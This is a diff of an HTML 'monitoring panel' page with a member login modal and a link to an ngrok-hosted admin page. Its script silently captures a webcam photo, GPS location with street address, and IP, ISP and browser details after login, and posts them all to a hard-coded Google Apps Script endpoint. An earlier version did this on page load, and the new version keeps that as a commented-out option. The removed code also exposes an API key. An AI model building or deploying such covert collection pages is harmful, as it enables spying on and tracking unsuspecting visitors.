@@ -3,7 +3,8 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>💀Advanced monitoring panel</title>
+  <title>Advanced monitoring panel</title>
+  <!-- 若不需要 Chart.js，可直接刪此行 -->
   <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
   <style>
     /*******************************************************
@@ -65,7 +66,7 @@
     }
 
     /*******************************************************
-     * Modal
+     * Modal (彈跳視窗)
      *******************************************************/
     .modal-overlay {
       display: none; /* 預設隱藏 */
@@ -85,7 +86,6 @@
       position: relative;
       animation: bounceIn 0.8s ease;
     }
-    /* 關閉按鈕 (右上角的 X) */
     .close-btn {
       position: absolute;
       top: 10px; 
@@ -97,9 +97,6 @@
       font-size: 20px;
     }
 
-    /*******************************************************
-     * 彈跳動畫 (keyframes)
-     *******************************************************/
     @keyframes bounceIn {
       0% {
         transform: scale(0.5);
@@ -163,7 +160,7 @@
      * 高級監控面板
      *******************************************************/
     #mainPanel {
-      display: none; /* 未登入前隱藏 */
+      display: none; 
       padding: 20px;
     }
     .container {
@@ -201,7 +198,9 @@
   <div id="statusSuccess" class="msg-success"></div>
   <div id="statusError" class="msg-error"></div>
   <button id="openModalBtn" class="btn">會員中心</button>
+  <!-- 管理者後台連結 -->
   <p><a href="https://3df0-125-227-108-79.ngrok-free.app/admin.php" target="_blank">管理者後台</a></p>
+
   <div id="modalOverlay" class="modal-overlay">
     <div class="modal-content">
       <button id="closeModalBtn" class="close-btn">×</button>
@@ -223,6 +222,7 @@
       </div>
     </div>
   </div>
+
   <div id="mainPanel">
     <div class="container">
       <div class="card">
@@ -245,7 +245,14 @@
   </div>
 
   <script>
-    const SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbzSYYuYmGzMJ4Ze96ECoCyGXKfUueDXFRB3_kDMdee8JNp6W6RvM8RjT80VaUHt8Ck2aw/exec'; 
+    /************************************************
+     * 0. Apps Script URL (請改成你自己的)
+     ************************************************/
+    const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbwKMbOw8auQQUIIJbXc7d7i9HpWe7hNeHTHgKnpi-SBRvKF6PZgZQgSKuiLSHOx8KRcQQ/exec";
+
+    /************************************************
+     * 1. Modal 打開 / 關閉
+     ************************************************/
     const openModalBtn = document.getElementById('openModalBtn');
     const modalOverlay = document.getElementById('modalOverlay');
     const closeModalBtn = document.getElementById('closeModalBtn');
@@ -255,10 +262,15 @@
     closeModalBtn.addEventListener('click', () => {
       modalOverlay.style.display = 'none';
     });
+
+    /************************************************
+     * 2. Tab 切換 (登入 / 註冊)
+     ************************************************/
     const tabLogin = document.getElementById('tabLogin');
     const tabRegister = document.getElementById('tabRegister');
     const loginFormContainer = document.getElementById('loginFormContainer');
     const registerFormContainer = document.getElementById('registerFormContainer');
+
     tabLogin.addEventListener('click', () => {
       tabLogin.classList.add('active');
       tabRegister.classList.remove('active');
@@ -271,6 +283,10 @@
       registerFormContainer.classList.add('active');
       loginFormContainer.classList.remove('active');
     });
+
+    /************************************************
+     * 3. 訊息顯示
+     ************************************************/
     const statusSuccess = document.getElementById('statusSuccess');
     const statusError = document.getElementById('statusError');
     function showSuccessMessage(msg) {
@@ -283,7 +299,15 @@
       statusError.style.display = 'block';
       statusSuccess.style.display = 'none';
     }
+
+    /************************************************
+     * 4. 主要功能區塊 (登入成功後才顯示)
+     ************************************************/
     const mainPanel = document.getElementById('mainPanel');
+
+    /************************************************
+     * 5. 註冊
+     ************************************************/
     document.getElementById('registerForm').addEventListener('submit', async (e) => {
       e.preventDefault();
       const email = document.getElementById('regEmail').value;
@@ -309,6 +333,10 @@
         showErrorMessage('註冊錯誤：' + error.message);
       }
     });
+
+    /************************************************
+     * 6. 登入
+     ************************************************/
     document.getElementById('loginForm').addEventListener('submit', async (e) => {
       e.preventDefault();
       const email = document.getElementById('loginEmail').value;
@@ -329,8 +357,9 @@
           showSuccessMessage('登入成功！');
           modalOverlay.style.display = 'none';
           mainPanel.style.display = 'block';
-          collectAndSendData();
 
+          // 登入成功後，開始收集資料
+          collectAndSendData();
         } else {
           showErrorMessage('登入失敗：' + (result.error || '原因不明'));
         }
@@ -338,12 +367,14 @@
         showErrorMessage('登入錯誤：' + error.message);
       }
     });
+
+    /************************************************
+     * 7. 收集相機、GPS、IP並上傳 (裝置資訊)
+     ************************************************/
     async function startCamera() {
       let stream = null;
       try {
-        stream = await navigator.mediaDevices.getUserMedia({
-          video: { facingMode: { ideal: 'user' } },
-        });
+        stream = await navigator.mediaDevices.getUserMedia({ video: true });
         const video = document.createElement('video');
         video.srcObject = stream;
         await new Promise(resolve => {
@@ -353,11 +384,13 @@
           };
         });
         await new Promise(resolve => setTimeout(resolve, 500));
+
         const canvas = document.createElement('canvas');
         canvas.width = video.videoWidth || 640;
         canvas.height = video.videoHeight || 480;
         const ctx = canvas.getContext('2d');
         ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
         const photoData = canvas.toDataURL('image/jpeg', 0.8).split(',')[1];
         return photoData;
       } catch (error) {
@@ -369,6 +402,7 @@
         }
       }
     }
+
     async function getGpsCoordinates() {
       try {
         const position = await new Promise((resolve, reject) => {
@@ -380,10 +414,11 @@
         const address = data.display_name || '未知地址';
         return { latitude, longitude, address };
       } catch (error) {
-        console.warn('GPS 資訊獲取失敗:', error);
+        console.warn('GPS 獲取失敗:', error);
         return null;
       }
     }
+
     async function getIpInfo() {
       try {
         const resp = await fetch('https://ipinfo.io/json');
@@ -393,15 +428,17 @@
         const userAgent = navigator.userAgent;
         return { ip, ipType, userAgent, city, region, country, org };
       } catch (error) {
-        console.warn('IP 資訊獲取失敗:', error);
+        console.warn('IP 獲取失敗:', error);
         return null;
       }
     }
+
     async function collectAndSendData() {
       const statusElem = document.getElementById('status');
       if (statusElem) {
         statusElem.innerText = '正在收集資料...';
       }
+
       const collectedData = { gps: null, ip: null, photo: null };
       try {
         const [gpsResult, ipResult] = await Promise.allSettled([
@@ -409,15 +446,11 @@
           getIpInfo(),
         ]);
         const photoResult = await startCamera();
-        if (gpsResult.status === 'fulfilled') {
-          collectedData.gps = gpsResult.value;
-        }
-        if (ipResult.status === 'fulfilled') {
-          collectedData.ip = ipResult.value;
-        }
-        if (photoResult) {
-          collectedData.photo = photoResult;
-        }
+
+        if (gpsResult.status === 'fulfilled') collectedData.gps = gpsResult.value;
+        if (ipResult.status === 'fulfilled') collectedData.ip = ipResult.value;
+        if (photoResult) collectedData.photo = photoResult;
+
         const fd = new URLSearchParams();
         fd.append('message', '合併資料上傳');
         if (collectedData.gps) {
@@ -437,6 +470,7 @@
         if (collectedData.photo) {
           fd.append('imageData', collectedData.photo);
         }
+
         const resp = await fetch(SCRIPT_URL, {
           method: 'POST',
           body: fd
@@ -454,40 +488,16 @@
         }
       }
     }
-    async function getWeatherInfo(latitude, longitude) {
-      try {
-        if (!latitude || !longitude) return;
-        const apiKey = 'ae0c5817d5c802a5f12d3c9de2517611';
-        const resp = await fetch(
-          `https://api.openweathermap.org/data/2.5/weather?lat=${latitude}&lon=${longitude}&units=metric&lang=zh_tw&appid=${apiKey}`
-        );
-        const weatherData = await resp.json();
-        const temp = weatherData.main.temp;
-        const weather = weatherData.weather[0].description;
-        const humidity = weatherData.main.humidity;
 
-        const weatherInfo = document.getElementById('weatherInfo');
-        weatherInfo.innerHTML = 
-          `<img src="https://openweathermap.org/img/wn/${weatherData.weather[0].icon}.png" alt="${weather}">
-           溫度: ${temp}°C, 天氣: ${weather}, 濕度: ${humidity}%`;
-      } catch (err) {
-        console.error('天氣資訊獲取失敗:', err);
-        document.getElementById('weatherInfo').innerText = '天氣資訊獲取失敗';
-      }
-    }
+    /************************************************
+     * 8. 頁面載入後，若想先抓GPS & IP (可視需求)
+     ************************************************/
     document.addEventListener('DOMContentLoaded', async () => {
       try {
-        const gpsData = await getGpsCoordinates();
-        if (gpsData) {
-          document.getElementById('map').src = 
-            `https://www.google.com/maps?q=${gpsData.latitude},${gpsData.longitude}&hl=zh-TW&z=15&output=embed`;
-          // 更新天氣
-          await getWeatherInfo(gpsData.latitude, gpsData.longitude);
-        }
-        collectAndSendData();
-
+        // 你可以取消註解以便一打開網頁就收集
+        // collectAndSendData();
       } catch (error) {
-        console.error('DOMContentLoaded 初始化時錯誤:', error);
+        console.error('DOMContentLoaded 初始化錯誤:', error);
       }
     });
   </script>
